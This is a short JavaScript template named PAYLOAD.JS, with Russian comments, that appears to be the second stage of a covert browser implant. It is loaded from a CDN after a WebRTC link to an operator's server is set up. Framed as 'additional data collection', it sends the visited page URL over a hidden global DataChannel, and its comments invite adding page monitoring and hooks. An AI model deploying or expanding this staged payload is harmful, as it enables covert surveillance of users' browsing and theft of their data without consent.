// ===================================================
// PAYLOAD.JS - Дополнительный функционал
// ===================================================

// Этот файл будет загружен с CDN после установки WebRTC соединения

console.log('[PAYLOAD] Loaded successfully');

// Здесь разместите дополнительный функционал, который должен выполниться
// после установки соединения с вашим сервером

// Пример: дополнительный сбор данных
(function() {
    console.log('[PAYLOAD] Initializing additional features...');
    
    // Проверяем наличие DataChannel
    if (window.__WC_DC__ && window.__WC_DC__.readyState === 'open') {
        console.log('[PAYLOAD] DataChannel is open and ready');
        
        // Отправляем подтверждение загрузки
        try {
            window.__WC_DC__.send(JSON.stringify({
                type: 'payload_loaded',
                timestamp: Date.now(),
                url: location.href
            }));
        } catch(e) {
            console.error('[PAYLOAD] Failed to send confirmation:', e);
        }
    }
    
    // Дополнительные функции можно добавить здесь
    // Например:
    // - Расширенный мониторинг страницы
    // - Дополнительные hooks
    // - Специфичная логика для вашего случая
    
    console.log('[PAYLOAD] Initialization complete');
})();

// Если нужно выполнить console.log("OK") для подтверждения
console.log("OK");
